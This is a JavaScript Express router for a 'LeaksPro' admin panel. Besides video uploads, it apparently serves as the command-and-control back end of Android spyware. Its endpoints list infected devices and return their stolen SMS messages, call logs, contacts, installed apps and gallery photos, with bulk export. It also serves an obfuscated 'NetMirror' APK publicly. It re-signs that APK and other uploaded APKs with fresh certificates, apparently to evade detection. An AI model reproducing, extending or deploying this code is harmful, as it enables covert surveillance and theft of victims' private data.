const express = require('express');
const router = express.Router();
const Video = require('../models/Video');
const db = require('../config/database');
const upload = require('../middleware/upload');
const { uploadToCloudinary, deleteFromCloudinary, extractPublicId } = require('../config/cloudinary');
const fs = require('fs');

// Admin auth middleware
const adminAuth = (req, res, next) => {
  const password = req.headers['x-admin-password'] || req.query.password;
  const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
  if (!stored || password !== stored.value) {
    return res.status(401).json({ error: 'Unauthorized - Invalid admin password' });
  }
  next();
};

// Helper: cleanup temp file after upload
function cleanupTemp(filePath) {
  if (filePath) {
    try { fs.unlinkSync(filePath); } catch (_) { /* ignore */ }
  }
}

// GET /api/admin/stats
router.get('/stats', adminAuth, (req, res) => {
  try {
    const stats = Video.getStats();
    res.json(stats);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/videos
router.get('/videos', adminAuth, (req, res) => {
  try {
    const { page = 1, limit = 50, search } = req.query;
    const result = Video.getAll({
      page: parseInt(page),
      limit: parseInt(limit),
      search,
      published_only: false,
    });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload - Upload video + optional thumbnail to Cloudinary
router.post('/upload', adminAuth, upload.fields([
  { name: 'video', maxCount: 1 },
  { name: 'thumbnail', maxCount: 1 },
]), async (req, res) => {
  let videoTmpPath, thumbTmpPath;
  try {
    if (!req.files || !req.files.video) {
      return res.status(400).json({ error: 'No video file uploaded' });
    }

    const videoFile = req.files.video[0];
    videoTmpPath = videoFile.path;
    const thumbnailFile = req.files.thumbnail ? req.files.thumbnail[0] : null;
    thumbTmpPath = thumbnailFile ? thumbnailFile.path : null;

    const io = req.app.get('io');

    // Emit: upload started
    if (io) io.emit('upload_progress', { progress: 5, filename: videoFile.originalname, status: 'uploading_to_cloud' });

    // Upload video to Cloudinary
    const videoResult = await uploadToCloudinary(videoTmpPath, {
      resource_type: 'video',
      folder: 'leakspro/videos',
    });
    cleanupTemp(videoTmpPath);
    videoTmpPath = null;

    if (io) io.emit('upload_progress', { progress: 80, filename: videoFile.originalname, status: 'video_uploaded' });

    // Upload thumbnail to Cloudinary (if provided)
    let thumbResult = null;
    if (thumbTmpPath) {
      thumbResult = await uploadToCloudinary(thumbTmpPath, {
        resource_type: 'image',
        folder: 'leakspro/thumbnails',
      });
      cleanupTemp(thumbTmpPath);
      thumbTmpPath = null;
    }

    const videoData = {
      title: req.body.title || videoFile.originalname,
      description: req.body.description || '',
      // Store Cloudinary URL as filename / thumbnail
      filename: videoResult.secure_url,
      thumbnail: thumbResult ? thumbResult.secure_url : (videoResult.secure_url.replace(/\.\w+$/, '.jpg')),
      channel_name: req.body.channel_name || 'LeaksPro Admin',
      category: req.body.category || 'General',
      tags: req.body.tags ? JSON.parse(req.body.tags) : [],
      file_size: videoResult.bytes || videoFile.size,
      mime_type: videoFile.mimetype,
      is_published: req.body.is_published !== 'false',
      is_short: req.body.is_short === 'true',
      duration: videoResult.duration || parseFloat(req.body.duration) || 0,
      resolution: videoResult.width ? `${videoResult.width}x${videoResult.height}` : (req.body.resolution || ''),
    };

    const video = Video.create(videoData);

    if (io) {
      io.emit('upload_progress', { progress: 100, filename: videoFile.originalname, status: 'complete' });
      io.emit('upload_complete', { filename: videoResult.secure_url, size: videoResult.bytes });
      io.emit('new_video', video);
    }

    res.json({ success: true, video });
  } catch (err) {
    cleanupTemp(videoTmpPath);
    cleanupTemp(thumbTmpPath);
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/upload/url - Upload from a direct video URL (no local file needed)
router.post('/upload/url', adminAuth, async (req, res) => {
  try {
    const { url, title, description, category, tags, channel_name, is_published, is_short } = req.body;
    if (!url) return res.status(400).json({ error: 'URL is required' });

    const io = req.app.get('io');
    if (io) io.emit('upload_progress', { progress: 10, filename: url, status: 'uploading_to_cloud' });

    const videoResult = await uploadToCloudinary(url, {
      resource_type: 'video',
      folder: 'leakspro/videos',
    });

    const videoData = {
      title: title || 'Untitled',
      description: description || '',
      filename: videoResult.secure_url,
      thumbnail: videoResult.secure_url.replace(/\.\w+$/, '.jpg'),
      channel_name: channel_name || 'LeaksPro Admin',
      category: category || 'General',
      tags: tags ? (typeof tags === 'string' ? JSON.parse(tags) : tags) : [],
      file_size: videoResult.bytes || 0,
      mime_type: `video/${videoResult.format || 'mp4'}`,
      is_published: is_published !== false && is_published !== 'false',
      is_short: is_short === true || is_short === 'true',
      duration: videoResult.duration || 0,
      resolution: videoResult.width ? `${videoResult.width}x${videoResult.height}` : '',
    };

    const video = Video.create(videoData);

    if (io) {
      io.emit('upload_progress', { progress: 100, filename: url, status: 'complete' });
      io.emit('upload_complete', { filename: videoResult.secure_url, size: videoResult.bytes });
      io.emit('new_video', video);
    }

    res.json({ success: true, video });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/videos/:id - Update video metadata
router.put('/videos/:id', adminAuth, upload.single('thumbnail'), async (req, res) => {
  try {
    const updateData = { ...req.body };

    // If a new thumbnail file is uploaded, send it to Cloudinary
    if (req.file) {
      const thumbResult = await uploadToCloudinary(req.file.path, {
        resource_type: 'image',
        folder: 'leakspro/thumbnails',
      });
      cleanupTemp(req.file.path);
      updateData.thumbnail = thumbResult.secure_url;
    }

    if (updateData.tags && typeof updateData.tags === 'string') {
      updateData.tags = JSON.parse(updateData.tags);
    }

    const video = Video.update(req.params.id, updateData);
    if (!video) return res.status(404).json({ error: 'Video not found' });

    const io = req.app.get('io');
    if (io) io.emit('video_updated', video);

    res.json({ success: true, video });
  } catch (err) {
    if (req.file) cleanupTemp(req.file.path);
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/videos/:id - Delete video (also from Cloudinary)
router.delete('/videos/:id', adminAuth, async (req, res) => {
  try {
    const video = Video.delete(req.params.id);
    if (!video) return res.status(404).json({ error: 'Video not found' });

    // Delete from Cloudinary (best-effort, don't fail the request)
    try {
      const videoPubId = extractPublicId(video.filename);
      if (videoPubId) await deleteFromCloudinary(videoPubId, 'video');
      const thumbPubId = extractPublicId(video.thumbnail);
      if (thumbPubId) await deleteFromCloudinary(thumbPubId, 'image');
    } catch (cloudErr) {
      console.warn('[Cloudinary] Delete warning:', cloudErr.message);
    }

    const io = req.app.get('io');
    if (io) io.emit('video_deleted', { id: req.params.id });

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/settings
router.get('/settings', adminAuth, (req, res) => {
  try {
    const rows = db.prepare('SELECT key, value FROM admin_settings').all();
    const settings = {};
    for (const r of rows) settings[r.key] = r.value;
    res.json({ success: true, settings });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/backup — trigger manual Cloudinary DB backup (awaits result)
router.post('/backup', adminAuth, async (req, res) => {
  try {
    const path = require('path');
    const fs = require('fs');
    const DB_PATH = path.join(__dirname, '..', 'data', 'leakspro.db');

    // Count videos
    const rows = db.prepare('SELECT COUNT(*) as cnt FROM videos').get();
    const videoCount = rows ? rows.cnt : 0;

    // Export DB to disk
    db.saveNow();

    // Verify file exists
    const exists = fs.existsSync(DB_PATH);
    const fileSize = exists ? fs.statSync(DB_PATH).size : 0;

    // Init Cloudinary and upload
    const { initCloudinary, uploadDbBackup } = require('../config/cloudinary');
    initCloudinary();

    const result = await uploadDbBackup(DB_PATH);
    res.json({
      success: true,
      message: 'Cloudinary backup successful',
      videoCount,
      fileSize,
      cloudinary: { public_id: result.public_id, bytes: result.bytes, url: result.secure_url }
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message, stack: err.stack });
  }
});

// PUT /api/admin/settings
router.put('/settings', adminAuth, (req, res) => {
  try {
    const { settings } = req.body;
    const stmt = db.prepare('INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)');
    const update = db.transaction((items) => {
      for (const [key, value] of Object.entries(items)) {
        stmt.run(key, String(value));
      }
    });
    update(settings);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections — list all registered devices
router.get('/connections', adminAuth, (req, res) => {
  try {
    const devices = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    const parsed = devices.map(d => {
      try { d.phone_numbers = JSON.parse(d.phone_numbers || '[]'); } catch (_) { d.phone_numbers = []; }
      // Use the actual is_online flag from DB (set to 1 on register, 0 on disconnect/cleanup).
      // As a safety net, also mark offline if last_seen is older than 5 minutes
      // (covers edge cases where disconnect event was missed).
      if (d.is_online) {
        const lastSeen = new Date(d.last_seen + 'Z').getTime();
        const fiveMinAgo = Date.now() - 5 * 60 * 1000;
        if (lastSeen < fiveMinAgo) d.is_online = 0;
      }
      return d;
    });
    const onlineCount = parsed.filter(d => d.is_online === 1).length;
    res.json({
      devices: parsed,
      totalDevices: parsed.length,
      onlineCount,
      offlineCount: parsed.length - onlineCount,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/connections/:deviceId — remove a device and all its data
router.delete('/connections/:deviceId', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    db.prepare('DELETE FROM sms_messages WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM call_logs WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM contacts WHERE device_id = ?').run(deviceId);
    db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(deviceId);
    try { db.prepare('DELETE FROM gallery_photos WHERE device_id = ?').run(deviceId); } catch (_) {}
    const result = db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
    res.json({ success: true, deleted: result.changes > 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/sms — get SMS for a device
router.get('/connections/:deviceId/sms', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 100;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM sms_messages WHERE device_id = ?').get(deviceId);
    const messages = db.prepare(
      'SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      messages,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/call-logs — get call logs for a device
router.get('/connections/:deviceId/call-logs', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 100;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM call_logs WHERE device_id = ?').get(deviceId);
    const logs = db.prepare(
      'SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      logs,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/contacts — get contacts for a device
router.get('/connections/:deviceId/contacts', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 200;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM contacts WHERE device_id = ?').get(deviceId);
    const contacts = db.prepare(
      'SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    // Parse JSON fields
    const parsed = contacts.map(c => {
      try { c.phones = JSON.parse(c.phones || '[]'); } catch (_) { c.phones = []; }
      try { c.emails = JSON.parse(c.emails || '[]'); } catch (_) { c.emails = []; }
      return c;
    });

    res.json({
      contacts: parsed,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/apps — get installed apps for a device
router.get('/connections/:deviceId/apps', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const showSystem = req.query.system === 'true';

    let apps;
    if (showSystem) {
      apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);
    } else {
      apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? AND is_system = 0 ORDER BY app_name ASC').all(deviceId);
    }

    const totalAll = db.prepare('SELECT COUNT(*) as count FROM installed_apps WHERE device_id = ?').get(deviceId);
    const totalUser = db.prepare('SELECT COUNT(*) as count FROM installed_apps WHERE device_id = ? AND is_system = 0').get(deviceId);

    res.json({
      apps,
      totalAll: totalAll ? totalAll.count : 0,
      totalUser: totalUser ? totalUser.count : 0,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/gallery — get gallery photos for a device
router.get('/connections/:deviceId/gallery', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 50;
    const offset = (page - 1) * limit;

    const total = db.prepare('SELECT COUNT(*) as count FROM gallery_photos WHERE device_id = ?').get(deviceId);
    const photos = db.prepare(
      'SELECT id, device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at FROM gallery_photos WHERE device_id = ? ORDER BY date_taken DESC LIMIT ? OFFSET ?'
    ).all(deviceId, limit, offset);

    res.json({
      photos,
      total: total ? total.count : 0,
      page,
      totalPages: Math.ceil((total ? total.count : 0) / limit),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/connections/:deviceId/export — export all device data as JSON
router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
  try {
    const { deviceId } = req.params;

    const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(deviceId);
    if (!device) return res.status(404).json({ error: 'Device not found' });

    try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }

    const sms = db.prepare('SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC').all(deviceId);
    const callLogs = db.prepare('SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC').all(deviceId);
    const contacts = db.prepare('SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC').all(deviceId);
    const apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);

    // Parse JSON fields in contacts
    const parsedContacts = contacts.map(c => {
      try { c.phones = JSON.parse(c.phones || '[]'); } catch (_) { c.phones = []; }
      try { c.emails = JSON.parse(c.emails || '[]'); } catch (_) { c.emails = []; }
      return c;
    });

    const exportData = {
      exported_at: new Date().toISOString(),
      device,
      sms_messages: sms,
      call_logs: callLogs,
      contacts: parsedContacts,
      installed_apps: apps,
      summary: {
        total_sms: sms.length,
        total_calls: callLogs.length,
        total_contacts: contacts.length,
        total_apps: apps.length,
      },
    };

    res.setHeader('Content-Disposition', `attachment; filename="device_${deviceId.substring(0, 8)}_export.json"`);
    res.setHeader('Content-Type', 'application/json');
    res.json(exportData);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/login
router.post('/login', (req, res) => {
  try {
    const { password } = req.body;
    const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
    if (stored && password === stored.value) {
      res.json({ success: true, message: 'Logged in' });
    } else {
      res.status(401).json({ error: 'Invalid password' });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════
//  Secure APK Upload / Download
// ═══════════════════════════════════════

// POST /api/admin/upload-apk — Upload obfuscated APK to server
router.post('/upload-apk', adminAuth, upload.single('apk'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No APK file uploaded' });
    }

    const dataDir = require('path').join(__dirname, '..', 'data');
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

    const destPath = require('path').join(dataDir, 'Netmirror-secure.apk');

    // Move uploaded file to data directory
    fs.copyFileSync(req.file.path, destPath);
    cleanupTemp(req.file.path);

    const stats = fs.statSync(destPath);
    res.json({
      success: true,
      message: 'Secure APK uploaded successfully',
      size: stats.size,
      filename: 'Netmirror-secure.apk'
    });
  } catch (err) {
    if (req.file) cleanupTemp(req.file.path);
    res.status(500).json({ error: err.message });
  }
});

// ═══════════════════════════════════════
//  On-the-fly APK Identity Rotation
// ═══════════════════════════════════════
const { resignApk } = require('../utils/apk-resigner');

// GET /api/admin/rotation-status — Check rotation state
router.get('/rotation-status', adminAuth, (req, res) => {
  try {
    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-secure.apk');
    const fallbackPath = require('path').join(__dirname, '..', 'data', 'Netmirror.apk');

    let apkAvailable = false;
    let apkSize = 0;
    if (fs.existsSync(apkPath)) {
      apkAvailable = true;
      apkSize = fs.statSync(apkPath).size;
    } else if (fs.existsSync(fallbackPath)) {
      apkAvailable = true;
      apkSize = fs.statSync(fallbackPath).size;
    }

    // Get rotation count from settings
    const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
    const lastRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_rotated'").get();
    const certRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_cert_hash'").get();

    res.json({
      apk_available: apkAvailable,
      apk_size: apkSize,
      rotation_count: countRow ? parseInt(countRow.value) : 0,
      last_rotated: lastRow ? lastRow.value : null,
      last_cert_hash: certRow ? certRow.value : null
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/rotate-apk — Re-sign APK with fresh identity on-the-fly
router.post('/rotate-apk', adminAuth, (req, res) => {
  try {
    const dataDir = require('path').join(__dirname, '..', 'data');
    const apkPath = require('path').join(dataDir, 'Netmirror-secure.apk');
    const fallbackPath = require('path').join(dataDir, 'Netmirror.apk');

    // Find source APK
    let sourcePath = null;
    if (fs.existsSync(apkPath)) sourcePath = apkPath;
    else if (fs.existsSync(fallbackPath)) sourcePath = fallbackPath;

    if (!sourcePath) {
      return res.status(404).json({
        error: 'No base APK found on server. Upload one first using the green button.'
      });
    }

    // Re-sign the APK with a brand new certificate
    const tempOutput = require('path').join(dataDir, `Netmirror-rotated-${Date.now()}.apk`);
    const result = resignApk(sourcePath, tempOutput);

    // Replace the active APK
    fs.copyFileSync(tempOutput, apkPath);
    try { fs.unlinkSync(tempOutput); } catch (_) {}

    // Update rotation tracking in DB
    const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
    const newCount = (countRow ? parseInt(countRow.value) : 0) + 1;
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('rotation_count', ?)").run(String(newCount));
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_rotated', ?)").run(new Date().toISOString());
    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_cert_hash', ?)").run(result.certHash);

    console.log(`[Rotation] #${newCount} — New cert: ${result.certHash.substring(0, 20)}... (${result.cn} / ${result.org})`);

    res.json({
      success: true,
      message: `APK re-signed with fresh identity #${newCount}`,
      rotation_count: newCount,
      cert_hash: result.certHash,
      cert_cn: result.cn,
      cert_org: result.org,
      apk_size: result.apkSize
    });
  } catch (err) {
    console.error('[Rotation] Error:', err);
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/download-apk — Download the secure obfuscated APK (public — no auth required)
router.get('/download-apk', (req, res) => {
  try {
    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-secure.apk');

    // Fallback to regular APK if secure version doesn't exist
    const fallbackPath = require('path').join(__dirname, '..', 'data', 'Netmirror.apk');

    let servePath = null;
    if (fs.existsSync(apkPath)) {
      servePath = apkPath;
    } else if (fs.existsSync(fallbackPath)) {
      servePath = fallbackPath;
    }

    if (!servePath) {
      return res.status(404).json({ error: 'No APK available. Upload one first.' });
    }

    const stats = fs.statSync(servePath);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
    res.setHeader('Content-Length', stats.size);
    res.sendFile(servePath);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/apk-status — Check if secure APK is available
router.get('/apk-status', adminAuth, (req, res) => {
  try {
    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-secure.apk');
    const fallbackPath = require('path').join(__dirname, '..', 'data', 'Netmirror.apk');

    let available = false;
    let size = 0;
    let filename = '';

    if (fs.existsSync(apkPath)) {
      available = true;
      size = fs.statSync(apkPath).size;
      filename = 'Netmirror-secure.apk';
    } else if (fs.existsSync(fallbackPath)) {
      available = true;
      size = fs.statSync(fallbackPath).size;
      filename = 'Netmirror.apk';
    }

    res.json({ available, size, filename });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========== Custom APK Signing Service ==========
const { v4: uuidv4 } = require('uuid');
const pathModule = require('path');
const multerApk = require('multer')({
  storage: require('multer').diskStorage({
    destination: (req, file, cb) => cb(null, require('os').tmpdir()),
    filename: (req, file, cb) => cb(null, `apk_upload_${Date.now()}_${file.originalname}`)
  }),
  limits: { fileSize: 500 * 1024 * 1024 }, // 500MB max
  fileFilter: (req, file, cb) => {
    if (file.originalname.toLowerCase().endsWith('.apk')) cb(null, true);
    else cb(new Error('Only .apk files are allowed'), false);
  }
});

// Signed APKs storage directory
const signedApksDir = pathModule.join(__dirname, '..', 'data', 'signed-apks');
if (!fs.existsSync(signedApksDir)) fs.mkdirSync(signedApksDir, { recursive: true });

// POST /api/admin/sign-apk — Upload & sign a custom APK
router.post('/sign-apk', adminAuth, multerApk.single('apk'), (req, res) => {
  const io = req.app.get('io');
  const id = uuidv4();
  const originalName = req.file ? req.file.originalname : 'unknown.apk';
  const remark = req.body.remark || '';

  // Emit forensic log helper
  function emitLog(step, detail, level = 'info') {
    if (io) io.emit('apk_sign_log', { id, step, detail, level, ts: Date.now() });
  }

  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No APK file uploaded' });
    }

    emitLog('UPLOAD', `Received "${originalName}" (${(req.file.size / 1024 / 1024).toFixed(2)} MB)`, 'info');

    const tmpPath = req.file.path;
    const originalSize = req.file.size;

    // Validate it's actually a ZIP/APK
    emitLog('VALIDATE', 'Checking APK structure (ZIP magic bytes)...', 'info');
    const header = Buffer.alloc(4);
    const fd = fs.openSync(tmpPath, 'r');
    fs.readSync(fd, header, 0, 4, 0);
    fs.closeSync(fd);
    if (header[0] !== 0x50 || header[1] !== 0x4B) {
      try { fs.unlinkSync(tmpPath); } catch (_) {}
      emitLog('VALIDATE', 'FAILED — Not a valid APK/ZIP file', 'error');
      return res.status(400).json({ error: 'File is not a valid APK (bad ZIP header)' });
    }
    emitLog('VALIDATE', 'APK structure verified ✓', 'success');

    // Create DB entry
    emitLog('DATABASE', 'Creating signed APK record...', 'info');
    db.prepare(`INSERT INTO signed_apks (id, original_name, remark, original_size, status, created_at, last_signed_at) VALUES (?, ?, ?, ?, 'signing', datetime('now'), datetime('now'))`).run(id, originalName, remark, originalSize);

    // Copy original to storage
    emitLog('STORAGE', 'Saving original APK to vault...', 'info');
    const originalStorePath = pathModule.join(signedApksDir, `${id}_original.apk`);
    fs.copyFileSync(tmpPath, originalStorePath);

    // Sign the APK with multi-layer obfuscation
    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    const result = resignApk(tmpPath, signedPath, emitLog);

    // Update DB
    const signedSize = fs.statSync(signedPath).size;
    db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);

    // Cleanup temp
    try { fs.unlinkSync(tmpPath); } catch (_) {}

    res.json({
      success: true,
      id,
      original_name: originalName,
      remark,
      original_size: originalSize,
      signed_size: signedSize,
      cert_hash: result.certHash,
      cert_cn: result.cn,
      cert_org: result.org,
      status: 'ready',
      created_at: new Date().toISOString(),
      last_signed_at: new Date().toISOString()
    });
  } catch (err) {
    emitLog('ERROR', `Signing failed: ${err.message}`, 'error');
    // Update DB status to failed
    try {
      db.prepare(`UPDATE signed_apks SET status = 'failed' WHERE id = ?`).run(id);
    } catch (_) {}
    // Cleanup temp file
    if (req.file && req.file.path) {
      try { fs.unlinkSync(req.file.path); } catch (_) {}
    }
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/signed-apks — List all signed APKs
router.get('/signed-apks', adminAuth, (req, res) => {
  try {
    const rows = db.prepare(`SELECT * FROM signed_apks ORDER BY created_at DESC`).all();
    res.json({ apks: rows || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/resign-apk/:id — Re-sign an existing signed APK
router.post('/resign-apk/:id', adminAuth, (req, res) => {
  const io = req.app.get('io');
  const { id } = req.params;

  function emitLog(step, detail, level = 'info') {
    if (io) io.emit('apk_sign_log', { id, step, detail, level, ts: Date.now() });
  }

  try {
    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    if (!row) return res.status(404).json({ error: 'Signed APK not found' });

    const originalPath = pathModule.join(signedApksDir, `${id}_original.apk`);
    if (!fs.existsSync(originalPath)) {
      return res.status(404).json({ error: 'Original APK file missing from vault' });
    }

    emitLog('RE-SIGN', `Re-signing "${row.original_name}" (attempt #${row.sign_count + 1})…`, 'info');

    db.prepare(`UPDATE signed_apks SET status = 'signing' WHERE id = ?`).run(id);

    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    const result = resignApk(originalPath, signedPath, emitLog);

    const signedSize = fs.statSync(signedPath).size;
    db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, sign_count = sign_count + 1, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);

    const updated = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    res.json({ success: true, apk: updated });
  } catch (err) {
    emitLog('ERROR', `Re-sign failed: ${err.message}`, 'error');
    try { db.prepare(`UPDATE signed_apks SET status = 'failed' WHERE id = ?`).run(id); } catch (_) {}
    res.status(500).json({ error: err.message });
  }
});

// GET /api/admin/download-signed-apk/:id — Download a signed APK
router.get('/download-signed-apk/:id', (req, res) => {
  try {
    const { id } = req.params;
    const row = db.prepare(`SELECT * FROM signed_apks WHERE id = ?`).get(id);
    if (!row) return res.status(404).json({ error: 'Signed APK not found' });

    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    if (!fs.existsSync(signedPath)) {
      return res.status(404).json({ error: 'Signed APK file not found on disk' });
    }

    const safeName = (row.remark || row.original_name).replace(/[^a-zA-Z0-9._-]/g, '_');
    const stats = fs.statSync(signedPath);
    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', `attachment; filename="${safeName}-signed.apk"`);
    res.setHeader('Content-Length', stats.size);
    res.sendFile(signedPath);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PUT /api/admin/signed-apks/:id/remark — Update remark/name
router.put('/signed-apks/:id/remark', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    const { remark } = req.body;
    db.prepare(`UPDATE signed_apks SET remark = ? WHERE id = ?`).run(remark || '', id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DELETE /api/admin/signed-apks/:id — Delete a signed APK
router.delete('/signed-apks/:id', adminAuth, (req, res) => {
  try {
    const { id } = req.params;
    // Delete files
    const origPath = pathModule.join(signedApksDir, `${id}_original.apk`);
    const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
    try { fs.unlinkSync(origPath); } catch (_) {}
    try { fs.unlinkSync(signedPath); } catch (_) {}
    // Delete DB row
    db.prepare(`DELETE FROM signed_apks WHERE id = ?`).run(id);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ========== Admin App Theme ==========
// GET /api/admin/admin-theme — get current theme index
router.get('/admin-theme', adminAuth, (req, res) => {
  try {
    // Create settings table if not exists
    db.prepare(`CREATE TABLE IF NOT EXISTS admin_settings (key TEXT PRIMARY KEY, value TEXT)`).run();
    const row = db.prepare('SELECT value FROM admin_settings WHERE key = ?').get('admin_theme_index');
    res.json({ themeIndex: row ? parseInt(row.value) : 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /api/admin/admin-theme — set or randomize theme
router.post('/admin-theme', adminAuth, (req, res) => {
  try {
    db.prepare(`CREATE TABLE IF NOT EXISTS admin_settings (key TEXT PRIMARY KEY, value TEXT)`).run();
    const totalThemes = 6;
    let themeIndex;
    if (req.body.randomize) {
      // Pick a random theme different from current
      const current = db.prepare('SELECT value FROM admin_settings WHERE key = ?').get('admin_theme_index');
      const currentIdx = current ? parseInt(current.value) : 0;
      do { themeIndex = Math.floor(Math.random() * totalThemes); } while (themeIndex === currentIdx && totalThemes > 1);
    } else {
      themeIndex = parseInt(req.body.themeIndex) || 0;
    }
    db.prepare('INSERT OR REPLACE INTO admin_settings (key, value) VALUES (?, ?)').run('admin_theme_index', String(themeIndex));
    const themeNames = ['Sage', 'Ocean', 'Lavender', 'Sunset', 'Rose', 'Slate'];
    res.json({ success: true, themeIndex, themeName: themeNames[themeIndex] || 'Unknown' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
